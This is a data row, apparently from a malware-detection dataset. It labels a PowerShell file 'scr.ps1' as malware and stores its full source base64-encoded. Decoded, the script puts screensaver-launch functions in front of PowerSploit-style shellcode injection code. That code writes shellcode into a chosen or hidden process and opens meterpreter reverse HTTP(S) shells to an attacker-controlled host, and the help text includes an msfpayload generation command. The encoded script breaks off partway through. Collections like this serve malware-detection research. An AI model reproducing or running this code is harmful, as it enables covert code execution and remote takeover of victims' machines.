scr.ps1,c6a36f575a7cc6a58a73b646f7bc2011,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gYQp7CnN0YXJ0ICRlbnY6V0lORElSL1N5c3RlbTMyL1JpYmJvbnMuc2NyIC9zCn0KZnVuY3Rpb24gYgp7CnN0YXJ0ICRlbnY6V0lORElSL1N5c3RlbTMyL3NzVGV4dDNkLnNjciAvcwp9CmZ1bmN0aW9uIGMKewpzdGFydCAkZW52OldJTkRJUi9TeXN0ZW0zMi9NeXN0aWZ5LnNjciAvcwp9CmZ1bmN0aW9uIGQKewpzdGFydCAkZW52OldJTkRJUi9TeXN0ZW0zMi9CdWJibGVzLnNjciAvcwp9CmZ1bmN0aW9uIGUKewpzdGFydCAkZW52OldJTkRJUi9TeXN0ZW0zMi9QaG90b1NjcmVlbnNhdmVyLnNjciAvcwp9CmZ1bmN0aW9uIGYKewpzdGFydCAkZW52OldJTkRJUi9TeXN0ZW0zMi9zY3Juc2F2ZS5zY3IgL3MKfQpmdW5jdGlvbiBzaGVsbAp7CjwjCi5TWU5PUFNJUwoKSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBwcm9jZXNzIElEIG9mIHlvdXIgY2hvb3Npbmcgb3Igd2l0aGluIHRoZSBjb250ZXh0IG9mIHRoZSBydW5uaW5nIFBvd2VyU2hlbGwgcHJvY2Vzcy4KClBvd2VyU3Bsb2l0IEZ1bmN0aW9uOiBzaGVsbApBdXRob3I6IE1hdHRoZXcgR3JhZWJlciAoQG1hdHRpZmVzdGF0aW9uKQpMaWNlbnNlOiBCU0QgMy1DbGF1c2UKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBOb25lCk9wdGlvbmFsIERlcGVuZGVuY2llczogTm9uZQogCi5ERVNDUklQVElPTgoKUG9ydGlvbnMgb2YgdGhpcyBwcm9qZWN0IHdhcyBiYXNlZCB1cG9uIHN5cmluZ2UuYyB2MS4yIHdyaXR0ZW4gYnkgU3BlbmNlciBNY0ludHlyZQoKUG93ZXJTaGVsbCBleHBlY3RzIHNoZWxsY29kZSB0byBiZSBpbiB0aGUgZm9ybSAweFhYLDB4WFgsMHhYWC4gVG8gZ2VuZXJhdGUgeW91ciBzaGVsbGNvZGUgaW4gdGhpcyBmb3JtLCB5b3UgY2FuIHVzZSB0aGlzIGNvbW1hbmQgZnJvbSB3aXRoaW4gQmFja3RyYWNrIChUaGFua3MsIE1hdHQgYW5kIGcwdG0xbGspOgoKbXNmcGF5bG9hZCB3aW5kb3dzL2V4ZWMgQ01EPSJjbWQgL2sgY2FsYyIgRVhJVEZVTkM9dGhyZWFkIEMgfCBzZWQgJzEsNmQ7cy9bIjtdLy9nO3MvXFwvLDAvZycgfCB0ciAtZCAnXG4nIHwgY3V0IC1jMi0gCgpNYWtlIHN1cmUgdG8gc3BlY2lmeSAndGhyZWFkJyBmb3IgeW91ciBleGl0IHByb2Nlc3MuIEFsc28sIGRvbid0IGJvdGhlciBlbmNvZGluZyB5b3VyIHNoZWxsY29kZS4gSXQncyBlbnRpcmVseSB1bm5lY2Vzc2FyeS4KIAouUEFSQU1FVEVSIFByb2Nlc3NJRAoKUHJvY2VzcyBJRCBvZiB0aGUgcHJvY2VzcyB5b3Ugd2FudCB0byBpbmplY3Qgc2hlbGxjb2RlIGludG8uCgouUEFSQU1FVEVSIFNoZWxsY29kZQoKU3BlY2lmaWVzIGFuIG9wdGlvbmFsIHNoZWxsY29kZSBwYXNzZWQgaW4gYXMgYSBieXRlIGFycmF5CgouUEFSQU1FVEVSIExpc3RNZXRhc3Bsb2l0UGF5bG9hZHMKCkxpc3RzIGFsbCBvZiB0aGUgYXZhaWxhYmxlIE1ldGFzcGxvaXQgcGF5bG9hZHMgdGhhdCBzaGVsbCBzdXBwb3J0cwoKLlBBUkFNRVRFUiBMaG9zdAoKU3BlY2lmaWVzIHRoZSBJUCBhZGRyZXNzIG9mIHRoZSBhdHRhY2sgbWFjaGluZSB3YWl0aW5nIHRvIHJlY2VpdmUgdGhlIHJldmVyc2Ugc2hlbGwKCi5QQVJBTUVURVIgTHBvcnQKIApTcGVjaWZpZXMgdGhlIHBvcnQgb2YgdGhlIGF0dGFjayBtYWNoaW5lIHdhaXRpbmcgdG8gcmVjZWl2ZSB0aGUgcmV2ZXJzZSBzaGVsbAoKLlBBUkFNRVRFUiBQYXlsb2FkCgpTcGVjaWZpZXMgdGhlIG1ldGFzcGxvaXQgcGF5bG9hZCB0byB1c2UuIEN1cnJlbnRseSwgb25seSAnd2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHAnIGFuZCAnd2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHBzJyBwYXlsb2FkcyBhcmUgc3VwcG9ydGVkLgoKLlBBUkFNRVRFUiBVc2VyQWdlbnQKCk9wdGlvbmFsbHkgc3BlY2lmaWVzIHRoZSB1c2VyIGFnZW50IHRvIHVzZSB3aGVuIHVzaW5nIG1ldGVycHJldGVyIGh0dHAgb3IgaHR0cHMgcGF5bG9hZHMKCi5QQVJBTUVURVIgRm9yY2UKCkluamVjdHMgc2hlbGxjb2RlIHdpdGhvdXQgcHJvbXB0aW5nIGZvciBjb25maXJtYXRpb24uIEJ5IGRlZmF1bHQsIHNoZWxsIHByb21wdHMgZm9yIGNvbmZpcm1hdGlvbiBiZWZvcmUgcGVyZm9ybWluZyBhbnkgbWFsaWNpb3VzIGFjdC4KCi5FWEFNUExFCgpDOlxQUz4gc2hlbGwgLVByb2Nlc3NJZCA0Mjc0CgpEZXNjcmlwdGlvbgotLS0tLS0tLS0tLQpJbmplY3Qgc2hlbGxjb2RlIGludG8gcHJvY2VzcyBJRCA0Mjc0LgoKLkVYQU1QTEUKCkM6XFBTPiBzaGVsbAoKRGVzY3JpcHRpb24KLS0tLS0tLS0tLS0KSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBydW5uaW5nIGluc3RhbmNlIG9mIFBvd2VyU2hlbGwuCgouRVhBTVBMRQoKQzpcUFM+IFN0YXJ0LVByb2Nlc3MgQzpcV2luZG93c1xTeXNXT1c2NFxub3RlcGFkLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuCkM6XFBTPiAkUHJvYyA9IEdldC1Qcm9jZXNzIG5vdGVwYWQKQzpcUFM+IHNoZWxsIC1Qcm9jZXNzSWQgJFByb2MuSWQgLVBheWxvYWQgd2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHBzIC1MaG9zdCAxOTIuMTY4LjMwLjEyOSAtTHBvcnQgNDQzIC1WZXJib3NlCgpWRVJCT1NFOiBSZXF1ZXN0aW5nIG1ldGVycHJldGVyIHBheWxvYWQgZnJvbSBodHRwczovLzE5Mi4xNjguMzAuMTI5OjQ0My9JTklUTQpWRVJCT1NFOiBJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gUElEOiA0MDA0ClZFUkJPU0U6IEluamVjdGluZyBpbnRvIGEgV293NjQgcHJvY2Vzcy4KVkVSQk9TRTogVXNpbmcgMzItYml0IHNoZWxsY29kZS4KVkVSQk9TRTogU2hlbGxjb2RlIG1lbW9yeSByZXNlcnZlZCBhdCAweDAzQkUwMDAwClZFUkJPU0U6IEVtaXR0aW5nIDMyLWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuClZFUkJPU0U6IFRocmVhZCBjYWxsIHN0dWIgbWVtb3J5IHJlc2VydmVkIGF0IDB4MDAxQjAwMDAKVkVSQk9TRTogU2hlbGxjb2RlIGluamVjdGlvbiBjb21wbGV0ZSEKCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCkVzdGFibGlzaGVzIGEgcmV2ZXJzZSBodHRwcyBtZXRlcnByZXRlciBwYXlsb2FkIGZyb20gd2l0aGluIHRoZSBoaWRkZW4gbm90ZXBhZCBwcm9jZXNzLiBBIG11bHRpLWhhbmRsZXIgd2FzIHNldCB1cCB3aXRoIHRoZSBmb2xsb3dpbmcgb3B0aW9uczoKClBheWxvYWQgb3B0aW9ucyAod2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHBzKToKCk5hbWUgICAgICBDdXJyZW50IFNldHRpbmcgIFJlcXVpcmVkICBEZXNjcmlwdGlvbgotLS0tICAgICAgLS0tLS0tLS0tLS0tLS0tICAtLS0tLS0tLSAgLS0tLS0tLS0tLS0KRVhJVEZVTkMgIHRocmVhZCAgICAgICAgICAgeWVzICAgICAgIEV4aXQgdGVjaG5pcXVlOiBzZWgsIHRocmVhZCwgcHJvY2Vzcywgbm9uZQpMSE9TVCAgICAgMTkyLjE2OC4zMC4xMjkgICB5ZXMgICAgICAgVGhlIGxvY2FsIGxpc3RlbmVyIGhvc3RuYW1lCkxQT1JUICAgICA0NDMgICAgICAgICAgICAgIHllcyAgICAgICBUaGUgbG9jYWwgbGlzdGVuZXIgcG9ydAoKLkVYQU1QTEUKCkM6XFBTPiBzaGVsbCAtUGF5bG9hZCB3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMgLUxob3N0IDE5Mi4xNjguMzAuMTI5IC1McG9ydCA4MAoKRGVzY3JpcHRpb24KLS0tLS0tLS0tLS0KRXN0YWJsaXNoZXMgYSByZXZlcnNlIGh0dHAgbWV0ZXJwcmV0ZXIgcGF5bG9hZCBmcm9tIHdpdGhpbiB0aGUgcnVubmluZyBQd2VyU2hlbGwgcHJvY2Vzcy4gQSBtdWx0aS1oYW5kbGVyIHdhcyBzZXQgdXAgd2l0aCB0aGUgZm9sbG93aW5nIG9wdGlvbnM6CgpQYXlsb2FkIG9wdGlvbnMgKHdpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwKToKCk5hbWUgICAgICBDdXJyZW50IFNldHRpbmcgIFJlcXVpcmVkICBEZXNjcmlwdGlvbgotLS0tICAgICAgLS0tLS0tLS0tLS0tLS0tICAtLS0tLS0tLSAgLS0tLS0tLS0tLS0KRVhJVEZVTkMgIHRocmVhZCAgICAgICAgICAgeWVzICAgICAgIEV4aXQgdGVjaG5pcXVlOiBzZWgsIHRocmVhZCwgcHJvY2Vzcywgbm9uZQpMSE9TVCAgICAgMTkyLjE2OC4zMC4xMjkgICB5ZXMgICAgICAgVGhlIGxvY2FsIGxpc3RlbmVyIGhvc3RuYW1lCkxQT1JUICAgICA4MCAgICAgICAgICAgICAgIHllcyAgICAgICBUaGUgbG9jYWwgbGlzdGVuZXIgcG9ydAoKLkVYQU1QTEUKCkM6XFBTPiBzaGVsbCAtU2hlbGxjb2RlIEAoMHg5MCwweDkwLDB4QzMpCiAgICAKRGVzY3JpcHRpb24KLS0tLS0tLS0tLS0KT3ZlcnJpZGVzIHRoZSBzaGVsbGNvZGUgaW5jbHVkZWQgaW4gdGhlIHNjcmlwdCB3aXRoIGN1c3RvbSBzaGVsbGNvZGUgLSAweDkwIChOT1ApLCAweDkwIChOT1ApLCAweEMzIChSRVQpCldhcm5pbmc6IFRoaXMgc2NyaXB0IGhhcyBubyB3YXkgdG8gdmFsaWRhdGUgdGhhdCB5b3VyIHNoZWxsY29kZSBpcyAzMiB2cy4gNjQtYml0IQogICAgCi5FWEFNUExFCgpDOlxQUz4gc2hlbGwgLUxpc3RNZXRhc3Bsb2l0UGF5bG9hZHMKICAgIApQYXlsb2FkcwotLS0tLS0tLQp3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cAp3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMKCi5OT1RFUwoKVXNlIHRoZSAnLVZlcmJvc2UnIG9wdGlvbiB0byBwcmludCBkZXRhaWxlZCBpbmZvcm1hdGlvbi4KClBsYWNlIHlvdXIgZ2VuZXJhdGVkIHNoZWxsY29kZSBpbiAkU2hlbGxjb2RlMzIgYW5kICRTaGVsbGNvZGU2NCB2YXJpYWJsZXMgb3IgcGFzcyBpdCBpbiBhcyBhIGJ5dGUgYXJyYXkgdmlhIHRoZSAnLVNoZWxsY29kZScgcGFyYW1ldGVyCgpCaWcgdGhhbmtzIHRvIE9pc2luICh4MG4pIEdyZWhhbiAoQG9pc2luZykgZm9yIGFuc3dlcmluZyBhbGwgbXkgb2JzY3VyZSBxdWVzdGlvbnMgYXQgdGhlIGRyb3Agb2YgYSBoYXQgLSBodHRwOi8vd3d3Lm5pdm90Lm9yZy8KCi5MSU5LCgpodHRwOi8vd3d3LmV4cGxvaXQtbW9uZGF5LmNvbQojPgoKW0NtZGxldEJpbmRpbmcoIERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ1J1bkxvY2FsJywgU3VwcG9ydHNTaG91bGRQcm9jZXNzID0gJFRydWUgLCBDb25maXJtSW1wYWN0ID0gJ0hpZ2gnKV0gUGFyYW0gKAogICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgIFtVSW50MTZdCiAgICAkUHJvY2Vzc0lELAogICAgCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ1J1bkxvY2FsJyApXQogICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgIFtCeXRlW11dCiAgICAkU2hlbGxjb2RlLAogICAgCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVTZXQoICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcsCiAgICAgICAgICAgICAgICAgICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMnLAogICAgICAgICAgICAgICAgICBJZ25vcmVDYXNlID0gJFRydWUgKV0KICAgIFtTdHJpbmddCiAgICAkUGF5bG9hZCA9ICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcsCiAgICAKICAgIFtQYXJhbWV0ZXIoIFBhcmFtZXRlclNldE5hbWUgPSAnTGlzdFBheWxvYWRzJyApXQogICAgW1N3aXRjaF0KICAgICRMaXN0TWV0YXNwbG9pdFBheWxvYWRzLAogICAgCiAgICBbUGFyYW1ldGVyKCBNYW5kYXRvcnkgPSAkVHJ1ZSwKICAgICAgICAgICAgICAgIFBhcmFtZXRlclNldE5hbWUgPSAnTWV0YXNwbG9pdCcgKV0KICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICBbU3RyaW5nXQogICAgJExob3N0ID0gJzEyNy4wLjAuMScsCiAgICAKICAgIFtQYXJhbWV0ZXIoIE1hbmRhdG9yeSA9ICRUcnVlLAogICAgICAgICAgICAgICAgUGFyYW1ldGVyU2V0TmFtZSA9ICdNZXRhc3Bsb2l0JyApXQogICAgW1ZhbGlkYXRlUmFuZ2UoIDEsNjU1MzUgKV0KICAgIFtJbnRdCiAgICAkTHBvcnQgPSA4NDQzLAogICAgCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICBbU3RyaW5nXQogICAgJFVzZXJBZ2VudCA9ICdNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzUuMCknLAogICAgCiAgICBbU3dpdGNoXQogICAgJEZvcmNlID0gJEZhbHNlCikKCiAgICBTZXQtU3RyaWN0TW9kZSAtVmVyc2lvbiAyLjAKICAgIAogICAgIyBMaXN0IGFsbCBhdmFpbGFibGUgTWV0YXNwbG9pdCBwYXlsb2FkcyBhbmQgZXhpdCB0aGUgZnVuY3Rpb24KICAgIGlmICgkUHNDbWRsZXQuUGFyYW1ldGVyU2V0TmFtZSAtZXEgJ0xpc3RQYXlsb2FkcycpCiAgICB7CiAgICAgICAgJEF2YWlsYWJsZVBheWxvYWRzID0gKEdldC1Db21tYW5kIHNoZWxsKS5QYXJhbWV0ZXJzWydQYXlsb2FkJ10uQXR0cmlidXRlcyB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7JF8uVHlwZUlkIC1lcSBbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5WYWxpZGF0ZVNldEF0dHJpYnV0ZV19CiAgICAKICAgICAgICBmb3JlYWNoICgkUGF5bG9hZCBpbiAkQXZhaWxhYmxlUGF5bG9hZHMuVmFsaWRWYWx1ZXMpCiAgICAgICAgewogICAgICAgICAgICBOZXctT2JqZWN0IFBTT2JqZWN0IC1Qcm9wZXJ0eSBAeyBQYXlsb2FkcyA9ICRQYXlsb2FkIH0KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgUmV0dXJuCiAgICB9CgogICAgaWYgKCAkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb2Nlc3NJRCddICkKICAgIHsKICAgICAgICAjIEVuc3VyZSBhIHZhbGlkIHByb2Nlc3MgSUQgd2FzIHByb3ZpZGVkCiAgICAgICAgIyBUaGlzIGNvdWxkIGhhdmUgYmVlbiB2YWxpZGF0ZWQgdmlhICdWYWxpZGF0ZVNjcmlwdCcgYnV0IHRoZSBlcnJvciBnZW5lcmF0ZWQgd2l0aCBHZXQtUHJvY2VzcyBpcyBtb3JlIGRlc2NyaXB0aXZlCiAgICAgICAgR2V0LVByb2Nlc3MgLUlkICRQcm9jZXNzSUQgLUVycm9yQWN0aW9uIFN0b3AgfCBPdXQtTnVsbAogICAgfQogICAgCiAgICBmdW5jdGlvbiBMb2NhbDpHZXQtRGVsZWdhdGVUeXBlCiAgICB7CiAgICAgICAgUGFyYW0KICAgICAgICAoCiAgICAgICAgICAgIFtPdXRwdXRUeXBlKFtUeXBlXSldCiAgICAgICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDApXQogICAgICAgICAgICBbVHlwZVtdXQogICAgICAgICAgICAkUGFyYW1ldGVycyA9IChOZXctT2JqZWN0IFR5cGVbXSgwKSksCiAgICAgICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEgKV0KICAgICAgICAgICAgW1R5cGVdCiAgICAgICAgICAgICRSZXR1cm5UeXBlID0gW1ZvaWRdCiAgICAgICAgKQoKICAgICAgICAkRG9tYWluID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4KICAgICAgICAkRHluQXNzZW1ibHkgPSBOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKQogICAgICAgICRBc3NlbWJseUJ1aWxkZXIgPSAkRG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgkRHluQXNzZW1ibHksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikKICAgICAgICAkTW9kdWxlQnVpbGRlciA9ICRBc3NlbWJseUJ1aWxkZXIuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnTXlEZWxlZ2F0ZVR5cGUnLCAnQ2xhc3MsIFB1YmxpYywgU2VhbGVkLCBBbnNpQ2xhc3MsIEF1dG9DbGFzcycsIFtTeXN0ZW0uTXVsdGljYXN0RGVsZWdhdGVdKQogICAgICAgICRDb25zdHJ1Y3RvckJ1aWxkZXIgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lQ29uc3RydWN0b3IoJ1JUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljJywgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCAkUGFyYW1ldGVycykKICAgICAgICAkQ29uc3RydWN0b3JCdWlsZGVyLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQogICAgICAgICRNZXRob2RCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJFJldHVyblR5cGUsICRQYXJhbWV0ZXJzKQogICAgICAgICRNZXRob2RCdWlsZGVyLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQogICAgICAgIAogICAgICAgIFdyaXRlLU91dHB1dCAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCiAgICB9CgogICAgZnVuY3Rpb24gTG9jYWw6R2V0LVByb2NBZGRyZXNzCiAgICB7CiAgICAgICAgUGFyYW0KICAgICAgICAoCiAgICAgICAgICAgIFtPdXRwdXRUeXBlKFtJbnRQdHJdKV0KICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSApXQogICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAkTW9kdWxlLAogICAgICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSApXQogICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAkUHJvY2VkdXJlCiAgICAgICAgKQoKICAgICAgICAjIEdldCBhIHJlZmVyZW5jZSB0byBTeXN0ZW0uZGxsIGluIHRoZSBHQUMKICAgICAgICAkU3lzdGVtQXNzZW1ibHkgPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5HZXRBc3NlbWJsaWVzKCkgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5HbG9iYWxBc3NlbWJseUNhY2hlIC1BbmQgJF8uTG9jYXRpb24uU3BsaXQoJ1xcJylbLTFdLkVxdWFscygnU3lzdGVtLmRsbCcpIH0KICAgICAgICAkVW5zYWZlTmF0aXZlTWV0aG9kcyA9ICRTeXN0ZW1Bc3NlbWJseS5HZXRUeXBlKCdNaWNyb3NvZnQuV2luMzIuVW5zYWZlTmF0aXZlTWV0aG9kcycpCiAgICAgICAgIyBHZXQgYSByZWZlcmVuY2UgdG8gdGhlIEdldE1vZHVsZUhhbmRsZSBhbmQgR2V0UHJvY0FkZHJlc3MgbWV0aG9kcwogICAgICAgICRHZXRNb2R1bGVIYW5kbGUgPSAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoJ0dldE1vZHVsZUhhbmRsZScpCiAgICAgICAgJEdldFByb2NBZGRyZXNzID0gJFVuc2FmZU5hdGl2ZU1ldGhvZHMuR2V0TWV0aG9kKCdHZXRQcm9jQWRkcmVzcycpCiAgICAgICAgIyBHZXQgYSBoYW5kbGUgdG8gdGhlIG1vZHVsZSBzcGVjaWZpZWQKICAgICAgICAkS2VybjMySGFuZGxlID0gJEdldE1vZHVsZUhhbmRsZS5JbnZva2UoJG51bGwsIEAoJE1vZHVsZSkpCiAgICAgICAgJHRtcFB0ciA9IE5ldy1PYmplY3QgSW50UHRyCiAgICAgICAgJEhhbmRsZVJlZiA9IE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigkdG1wUHRyLCAkS2VybjMySGFuZGxlKQogICAgICAgIAogICAgICAgICMgUmV0dXJuIHRoZSBhZGRyZXNzIG9mIHRoZSBmdW5jdGlvbgogICAgICAgIFdyaXRlLU91dHB1dCAkR2V0UHJvY0FkZHJlc3MuSW52b2tlKCRudWxsLCBAKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmXSRIYW5kbGVSZWYsICRQcm9jZWR1cmUpKQogICAgfQoKICAgICMgRW1pdHMgYSBzaGVsbGNvZGUgc3R1YiB0aGF0IHdoZW4gaW5qZWN0ZWQgd2lsbCBjcmVhdGUgYSB0aHJlYWQgYW5kIHBhc3MgZXhlY3V0aW9uIHRvIHRoZSBtYWluIHNoZWxsY29kZSBwYXlsb2FkCiAgICBmdW5jdGlvbiBMb2NhbDpFbWl0LUNhbGxUaHJlYWRTdHViIChbSW50UHRyXSAkQmFzZUFkZHIsIFtJbnRQdHJdICRFeGl0VGhyZWFkQWRkciwgW0ludF0gJEFyY2hpdGVjdHVyZSkKICAgIHsKICAgICAgICAkSW50U2l6ZVB0ciA9ICRBcmNoaXRlY3R1cmUgLyA4CgogICAgICAgIGZ1bmN0aW9uIExvY2FsOkNvbnZlcnRUby1MaXR0bGVFbmRpYW4gKFtJbnRQdHJdICRBZGRyZXNzKQogICAgICAgIHsKICAgICAgICAgICAgJExpdHRsZUVuZGlhbkJ5dGVBcnJheSA9IE5ldy1PYmplY3QgQnl0ZVtdKDApCiAgICAgICAgICAgICRBZGRyZXNzLlRvU3RyaW5nKCJYJCgkSW50U2l6ZVB0cioyKSIpIC1zcGxpdCAnKFtBLUYwLTldezJ9KScgfCBGb3JFYWNoLU9iamVjdCB7IGlmICgkXykgeyAkTGl0dGxlRW5kaWFuQnl0ZUFycmF5ICs9IFtCeXRlXSAoJzB4ezB9JyAtZiAkXykgfSB9CiAgICAgICAgICAgIFtTeXN0ZW0uQXJyYXldOjpSZXZlcnNlKCRMaXR0bGVFbmRpYW5CeXRlQXJyYXkpCiAgICAgICAgICAgIAogICAgICAgICAgICBXcml0ZS1PdXRwdXQgJExpdHRsZUVuZGlhbkJ5dGVBcnJheQogICAgICAgIH0KICAgICAgICAKICAgICAgICAkQ2FsbFN0dWIgPSBOZXctT2JqZWN0IEJ5dGVbXSgwKQogICAgICAgIAogICAgICAgIGlmICgkSW50U2l6ZVB0ciAtZXEgOCkKICAgICAgICB7CiAgICAgICAgICAgIFtCeXRlW11dICRDYWxsU3R1YiA9IDB4NDgsMHhCOCAgICAgICAgICAgICAgICAgICAgICAjIE1PViAgIFFXT1JEIFJBWCwgJnNoZWxsY29kZQogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gQ29udmVydFRvLUxpdHRsZUVuZGlhbiAkQmFzZUFkZHIgICAgICAgIyAmc2hlbGxjb2RlCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEZGLDB4RDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIENBTEwgIFJBWAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHg2QSwweDAwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBQVVNIICBCWVRFIDAKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4NDgsMHhCOCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgTU9WICAgUVdPUkQgUkFYLCAmRXhpdFRocmVhZAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gQ29udmVydFRvLUxpdHRsZUVuZGlhbiAkRXhpdFRocmVhZEFkZHIgIyAmRXhpdFRocmVhZAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHhGRiwweEQwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBDQUxMICBSQVgKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgW0J5dGVbXV0gJENhbGxTdHViID0gMHhCOCAgICAgICAgICAgICAgICAgICAgICAgICAgICMgTU9WICAgRFdPUkQgRUFYLCAmc2hlbGxjb2RlCiAgICAgICAgICAgICRDYWxsU3R1YiArPSBDb252ZXJ0VG8tTGl0dGxlRW5kaWFuICRCYXNlQWRkciAgICAgICAjICZzaGVsbGNvZGUKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4RkYsMHhEMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgQ0FMTCAgRUFYCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweDZBLDB4MDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIFBVU0ggIEJZVEUgMAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHhCOCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBEV09SRCBFQVgsICZFeGl0VGhyZWFkCiAgICAgICAgICAgICRDYWxsU3R1YiArPSBDb252ZXJ0VG8tTGl0dGxlRW5kaWFuICRFeGl0VGhyZWFkQWRkciAjICZFeGl0VGhyZWFkCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEZGLDB4RDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIENBTEwgIEVBWAogICAgICAgIH0KICAgICAgICAKICAgICAgICBXcml0ZS1PdXRwdXQgJENhbGxTdHViCiAgICB9CgogICAgZnVuY3Rpb24gTG9jYWw6SW5qZWN0LVJlbW90ZVNoZWxsY29kZSAoW0ludF0gJFByb2Nlc3NJRCkKICAgIHsKICAgICAgICAjIE9wZW4gYSBoYW5kbGUgdG8gdGhlIHByb2Nlc3MgeW91IHdhbnQgdG8gaW5qZWN0IGludG8KICAgICAgICAkaFByb2Nlc3MgPSAkT3BlblByb2Nlc3MuSW52b2tlKDB4MDAxRjBGRkYsICRmYWxzZSwgJFByb2Nlc3NJRCkgIyBQcm9jZXNzQWNjZXNzRmxhZ3MuQWxsICgweDAwMUYwRkZGKQogICAgICAgIAogICAgICAgIGlmICghJGhQcm9jZXNzKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBvcGVuIGEgcHJvY2VzcyBoYW5kbGUgZm9yIFBJRDogJFByb2Nlc3NJRCIKICAgICAgICB9CgogICAgICAgICRJc1dvdzY0ID0gJGZhbHNlCgogICAgICAgIGlmICgkNjRiaXRDUFUpICMgT25seSBwZXJmb3JtIHRoZXNlcyBjaGVja3M